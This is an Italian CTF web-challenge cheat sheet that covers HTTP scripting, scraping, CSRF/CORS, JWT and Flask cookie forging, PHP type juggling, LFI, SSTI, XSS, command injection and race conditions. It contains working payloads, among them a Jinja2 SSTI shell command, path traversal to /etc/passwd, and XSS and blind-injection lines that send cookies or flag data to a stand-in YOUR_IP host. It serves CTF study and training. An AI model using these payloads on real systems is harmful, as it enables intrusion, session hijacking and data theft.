# 01. Web Security

> [!abstract] Checklist Rapida Web Challenge
> 1. **Ispeziona il sorgente & rete**: `Ctrl+U` (commenti HTML, script JS), `DevTools → Network` (header custom, redirect 302, chiamate API), `Application → Cookies / LocalStorage`.
> 2. **File e directory noti**: `/robots.txt`, `/sitemap.xml`, `/.git/HEAD`, `/.env`, `/flag`, `/admin`.
> 3. **Metodi HTTP e Parametri**: prova `HEAD`, `OPTIONS`, `PUT`, modifica parametri GET/POST/JSON, cambia `Content-Type` o header (`X-Forwarded-For: 127.0.0.1`).
> 4. **Linguaggio backend**: errori/estensioni `.php` (Type Juggling, Array bypass, LFI `php://filter`), Python/Flask (Cookie firmati, SSTI Jinja2), Node/Express (Prototype pollution, JWT).

---

## 1. Python `requests` & Protocollo HTTP (`web 01`–`11`)

**Trigger**: Devi automatizzare richieste HTTP, inviare header/cookie custom, seguire o bloccare redirect, o testare metodi HTTP non standard.

```python
import requests

URL = "http://TARGET"

# 1. GET base + ispezione risposta
r = requests.get(URL)
print(r.status_code, r.headers)
print(r.text)        # Stringa decodificata (usa r.content per bytes grezzi)
# r.json()           # ATTENZIONE: e' un METODO con parentesi (), non un attributo!

# 2. Query parameters (?id=flag)
r = requests.get(URL, params={"id": "flag"})

# 3. Header custom (es. Accept, User-Agent, X-Password)
r = requests.get(URL, headers={"X-Password": "admin"})

# 4. Cookie singolo
r = requests.get(URL, cookies={"password": "admin"})

# 5. Sessione persistente (salva e reinvia automaticamente i cookie tra richieste)
s = requests.Session()
s.get(f"{URL}/cookie")       # Il server imposta Set-Cookie
r = s.get(f"{URL}/flag")     # La Session invia automaticamente il cookie ricevuto

# 6. Bloccare i redirect (fondamentale se una pagina 302 nasconde la flag nel body o negli header!)
r = requests.get(f"{URL}/secret", allow_redirects=False)
print(r.headers.get("Location"), r.text)
```

### Metodi HTTP, Form, JSON e Verbi Inattesi

- **MIME (`Content-Type`)**: identifica il formato del body inviato al server.
  - **`application/x-www-form-urlencoded`**: formato standard dei `<form>` HTML (`username=admin&password=admin`).
  - **`application/json`**: usato da API REST (`{"username": "admin"}`).
- **`HEAD`**: teoricamente identico a `GET` ma senza body (usato per leggere solo dimensioni/header di file enormi). Server mal configurati possono eseguire logica diversa o esporre header sensibili.
- **`OPTIONS` & Verbi non supportati**: `OPTIONS` interroga i metodi permessi (`Allow: GET, POST`). Inviare intenzionalmente metodi inattesi (`PUT`, `PATCH`, `DELETE`) può generare crash informativi o bypassare controlli di accesso implementati solo su `GET`/`POST`.

```python
# POST Form (application/x-www-form-urlencoded)
r = requests.post(URL, data={"username": "admin", "password": "admin"})

# POST JSON (application/json)
r = requests.post(URL, json={"username": "admin", "password": "admin"})

# HEAD & OPTIONS + test metodi non supportati
print(requests.head(URL).headers)
print(requests.options(URL).headers.get("Allow"))

for method in ["PUT", "PATCH", "DELETE"]:
    resp = requests.request(method, URL)
    print(method, resp.status_code, resp.headers, resp.text)
```

---

## 2. Scraping & Crawling con `BeautifulSoup` (`web 12`–`16`)

**Trigger**: La flag è nascosta in tag HTML specifici, in commenti `<!-- ... -->`, dentro file `.js`/`.css` collegati, o sparsa su decine di sottopagine collegate tra loro.

```python
import requests
from bs4 import BeautifulSoup, Comment
from collections import deque
from urllib.parse import urljoin

BASE = "http://TARGET/"
r = requests.get(BASE)
soup = BeautifulSoup(r.text, "html.parser")

# 1. Cercare tag specifici (es. tutti i <p>, <h1>, <a href>)
for tag in soup.find_all(["p", "h1"]):
    print(tag.get_text(strip=True))

# 2. Estrarre tutti i commenti HTML <!-- ... -->
for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
    print("Commento:", comment.strip())

# 3. Leggere risorse collegate (<script src="..."> e <link href="...">)
for res in soup.find_all(["script", "link"]):
    path = res.get("src") or res.get("href")
    if path:
        print(path, requests.get(urljoin(BASE, path)).text[:200])

# 4. Spider / BFS Crawler completo per trovare la flag in un grafo di link
queue, visited = deque([BASE]), set()
while queue:
    curr = queue.popleft()
    if curr in visited:
        continue
    visited.add(curr)
    resp = requests.get(curr)
    if "flag{" in resp.text:
        print("TROVATA in", curr)
        print(resp.text)
        break
    s_page = BeautifulSoup(resp.text, "html.parser")
    for a in s_page.find_all("a", href=True):
        nxt = urljoin(curr, a["href"])
        if nxt.startswith(BASE) and nxt not in visited:
            queue.append(nxt)
```

---

## 3. CSRF, SOP e CORS (`web 17`)

**Trigger**: Operazioni sensibili eseguite via cookie di sessione senza validazione dell'origine/token, oppure challenge in cui il server ruota un token `csrf` ad ogni chiamata.

### Cosa sfrutta davvero il CSRF?
Il CSRF (*Cross-Site Request Forgery*) sfrutta la **Ambient Authority dei cookie nel browser**:
- Il browser **allega automaticamente** i cookie di `banca.it` a qualsiasi richiesta inviata verso `banca.it`, **anche se la richiesta parte da un altro sito** (`evil.com`) o da un link cliccato dalla vittima!
- Il server vede una richiesta con un cookie di sessione valido e la esegue come se fosse intenzionale, non sapendo distinguere tra un click legittimo su `banca.it` e un form/link nascosto su `evil.com`.

### Flusso tipico (4 passaggi)
1. L'attaccante prepara una richiesta malevola verso un endpoint privo di protezione (es. `<form action="https://banca.it/transfer" method="POST">`).
2. Induce la vittima autenticata a visitare la pagina o cliccare il link.
3. Il browser della vittima invia la richiesta a `banca.it` allegando automaticamente i cookie di sessione della vittima.
4. Il server accetta e esegue l'azione con i permessi della vittima.

- **CSRF su `GET`**: le `GET` non dovrebbero mai modificare lo stato del server (operazioni idempotenti); se un endpoint cambia stato via `GET` (es. `/transfer?to=evil`), basta anche un tag `<img src="...">`.
- **CSRF su `POST`**: cambia lo stato del server; va protetto con token anti-CSRF e attributo `SameSite`.

### Difese (SOP, CORS, Token, SameSite)

| Meccanismo | Cosa fa | Limite / Nota CTF |
| :--- | :--- | :--- |
| **SOP** (*Same-Origin Policy*) | Impedisce a JavaScript su origine A di **leggere** risposte da origine B (diverso `protocollo + host + porta`). | **Non** blocca l'invio di richieste "semplici" (es. `<form>` POST o `<img>` GET): impedisce solo di leggere la risposta! |
| **CORS** (*Cross-Origin Resource Sharing*) | Header server (`Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`) per rilassare selettivamente la SOP. | Misconfig tipica: server riflette qualunque `Origin` + `Allow-Credentials: true` → un sito terzo può leggere dati autenticati via `fetch()`. |
| **Synchronizer Token Pattern** | Il server invia un token casuale legato alla sessione dentro il form/JSON e lo verifica al submit. | Poiché l'origine terza non può leggere la pagina (per la SOP), non può conoscere il token. |
| **Cookie `SameSite`** | `Strict`: mai inviato cross-site. `Lax` (default moderno): inviato solo su navigazioni top-level `GET`, bloccato su `POST` cross-site. `None`: sempre inviato (richiede `Secure`). | Se un'app usa solo `SameSite=Lax` ma esegue modifiche su `GET`, resta vulnerabile tramite redirect/link. |
| **Cookie-to-Header** | Il client legge il token da un cookie e lo invia in un header custom (`X-CSRF-Token`). | Un sito terzo non può leggere il cookie (SOP) né impostare header custom senza CORS preflight. |

### Snippet: Challenge con CSRF Token Rotante (`web 17`)

```python
import requests

URL = "http://TARGET"
s = requests.Session()  # Obbligatorio: lega il token CSRF al cookie di sessione

r = s.post(f"{URL}/login", json={"username": "admin", "password": "admin"})
csrf = r.json()["csrf"]

for i in range(4):
    r = s.get(f"{URL}/flag_piece", params={"index": i, "csrf": csrf})
    print(r.text)
    # Se il server ruota il token ad ogni risposta, aggiornalo per la richiesta successiva:
    data = r.json()
    if "csrf" in data:
        csrf = data["csrf"]
```

---

## 4. Cookies, Sessioni Flask & JWT

**Trigger**: Cookie in Base64, stringhe `eyJ...` (JWT), cookie Flask `session=ey...signature`.

### JWT (JSON Web Token)
Struttura: `Base64Url(Header).Base64Url(Payload).Base64Url(Signature)`.
1. **Decodifica subito Header e Payload**: `echo "<part>" | base64 -d` (o `jwt.io` / Python).
2. **Attacchi CTF classici**:
   - **`alg: none`**: cambia `"alg": "none"` nell'header, modifica il payload (es. `"admin": true`) e lascia la firma vuota conservando il punto finale: `header.payload.`.
   - **Segreto HMAC (`HS256`) debole**: brute-force con `hashcat -m 16500 jwt.txt wordlist.txt` o `john`.
   - **Key Confusion (`RS256` → `HS256`)**: se il server espone la chiave pubblica RSA e non forza l'algoritmo durante `verify()`, firma il token con `HS256` usando la chiave pubblica come segreto HMAC.

### Flask Signed Session Cookie
Il cookie Flask contiene `payload.timestamp.firma` (e talvolta inizia con `.eJw...` se compresso con zlib):
- **Decodificabile da chiunque** (è firmato, NON cifrato!): puoi sempre leggerlo con `flask-unsign --decode --cookie "<cookie>"`.
- Se trovi la `SECRET_KEY` (o è debole): `flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt` e poi `flask-unsign --sign --cookie "{'admin': True}" --secret "KEY"`.

---

## 5. PHP Quirks & Bypass (`ConfuseMe`, `MakeAWish`)

**Trigger**: Codice sorgente `.php` esposto o errori PHP (`Warning: strcmp()`, `preg_match()`).

### 1. Type Juggling (`==` vs `===`) e Magic Hashes
In PHP `==` converte i tipi prima di confrontare:
- Stringhe che iniziano con `0e` seguite **solo da cifre** (`0e12345`) vengono interpretate come notazione scientifica $0 \times 10^{12345} = 0$!
  - Quindi `md5("240610708") == md5("QNKCDZO")` è **`TRUE`** (`"0e46..." == "0e83..."` → `0 == 0`).
- Confronto numero/stringa in PHP < 8: `0 == "admin"` è **`TRUE`**; `42 == "42abc"` è **`TRUE`**.
- **Magic Hashes noti**:
  - MD5: `240610708`, `QNKCDZO`, `aabg7XSs`
  - SHA1: `10932435112`, `aaroZmOk`

### 2. Array Bypass su `preg_match()`, `strcmp()`, `sha1()`, `md5()`
Se passi un array nella query string (es. `?password[]=x`), funzioni che si aspettano una stringa falliscono e restituiscono **`NULL`** o **`false`**:
- `strcmp($_GET['password'], $secret) == 0` → `strcmp(array, string)` restituisce `NULL`, e in PHP `NULL == 0` è **`TRUE`**!
- `preg_match("/flag/i", $_GET['wish'])` → restituisce `false` (con warning), bypassando controlli di filtro!
- `md5($_GET['a']) === md5($_GET['b'])` → se passi `?a[]=1&b[]=2`, entrambi i `md5()` restituiscono `NULL`, e persino `NULL === NULL` è **`TRUE`**!

---

## 6. LFI / Path Traversal, SSTI, XSS & Command Injection

### LFI (Local File Inclusion) & Path Traversal
**Trigger**: Parametri come `?page=home.php`, `?file=report.pdf`, `?lang=it`.
- **Payload base**: `../../../../etc/passwd`, `....//....//etc/passwd` (se il filtro rimuove `../` una sola volta).
- **Leggere codice sorgente PHP senza eseguirlo** (`php://filter`):
  ```text
  ?page=php://filter/convert.base64-encode/resource=index.php
  ```
  Decodifica la stringa Base64 risultante per leggere flag o credenziali nei sorgenti `.php`.

### SSTI (Server-Side Template Injection)
**Trigger**: L'input utente viene inserito direttamente dentro un template (Flask/Jinja2, Twig, EJS).
- **Test di rilevamento**: invia `{{7*7}}` o `${7*7}`.
  - Se risponde `49` (Jinja2/Twig), verifica quale engine è con `{{7*'7'}}` (`49` in Twig, `7777777` in Jinja2).
- **Jinja2 (Python/Flask) — Lettura config & ambiente**:
  ```jinja2
  {{ config }}
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id; cat flag*').read() }}
  ```
  *(Alternativa classica tramite classi base Python se `self` o `__builtins__` non sono diretti: `{{ ''.__class__.__mro__[1].__subclasses__() }}` per individuare `subprocess.Popen` o `os._wrap_close`.)*

### XSS (Cross-Site Scripting) & Session Hijacking
**Trigger**: Challenge con un "Admin Bot" che visita un URL o una pagina con commenti/profilo dove l'input HTML non viene sanitizzato.
- **Test rapido**: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`.
- **Esfiltrazione verso un tuo webhook** (es. `webhook.site`, `requestbin`, o `python3 -m http.server` su IP pubblico/VPN):
  ```html
  <script>fetch('http://YOUR_IP:8000/?c=' + encodeURIComponent(document.cookie))</script>
  <img src=x onerror="location='http://YOUR_IP:8000/?c='+encodeURIComponent(document.cookie)">
  ```
- **Nota `HttpOnly`**: se un cookie ha il flag `HttpOnly`, `document.cookie` **non può leggerlo** via JS; in quel caso l'XSS può comunque far eseguire al bot richieste `fetch()` verso endpoint interni autenticati (CSRF potenziato).

### Command Injection (OS Command Injection)
**Trigger**: Funzionalità che invocano tool di sistema (ping, traceroute, convert, unzip, `os.system`, `shell_exec`).
- **Separatori di comandi**: `;`, `&&`, `||`, `|`, `` `cmd` ``, `$(cmd)`, newline `%0a`.
- **Bypass filtri comuni**:
  - Spazi bloccati → usa `${IFS}` (`cat${IFS}/etc/passwd`) o tab `%09` o `<` (`cat</etc/passwd`).
  - Parola `flag` o `cat` bloccata → quote/backslash (`c'a't fl\ag.txt`) o `tac` / `head` / `nl` / `base64`.
- **Blind Command Injection**: se non vedi l'output, esfiltralo via HTTP/DNS (`curl http://YOUR_IP:8000/$(cat flag.txt | base64 -w0)`) o verifica con `sleep 3`.

### Race Condition (Richieste Concorrenti)
**Trigger**: Coupon riscattabili più volte, saldo/crediti insufficienti (`FlagsShop`), file temporanei creati e cancellati subito.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def action(_):
    return requests.post("http://TARGET/buy", cookies={"session": "..."}).text

with ThreadPoolExecutor(max_workers=20) as ex:
    results = list(ex.map(action, range(20)))
print(results)
```
